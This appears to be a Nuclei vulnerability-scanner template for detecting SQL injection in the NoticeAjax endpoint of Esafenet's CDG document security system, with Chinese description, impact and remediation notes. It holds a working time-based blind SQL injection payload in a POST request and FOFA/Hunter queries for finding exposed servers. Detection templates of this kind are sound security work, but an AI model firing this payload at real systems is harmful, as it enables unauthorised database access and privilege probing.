id: esafenet-noticeajax-sqli

info:
  name: Esafenet CDG NoticeAjax - SQL 注入漏洞
  author: adeljck
  severity: high
  description: |
    该模板用于检测 Esafenet CDG NoticeAjax - SQL 注入漏洞。该类漏洞通常源于接口将用户输入拼接到 SQL 语句中，导致攻击者可改变查询语义。模板主要向 `/CDGServer3/NoticeAjax;Service` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  classification:
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="电子文档安全管理系统",body="CDGServer3/"
    hunter-query: web.title="电子文档安全管理系统",web.body="CDGServer3/"
    product: electronic_document_security_management_system
    vendor: esafenet
  tags: esafenet,sqli,vuln

http:
  - raw:
      - |
        @timeout: 10s
        POST /CDGServer3/NoticeAjax;Service HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Content-Type: application/x-www-form-urlencoded

        command=delNotice&noticeId=123';if+(select+IS_SRVROLEMEMBER('sysadmin'))=1+WAITFOR+DELAY+'0:0:5'--

    matchers:
      - type: dsl
        dsl:
          - 'contains(content_type,"text/xml")'
          - 'contains(body,"OK")'
          - 'status_code == 200'
        condition: and
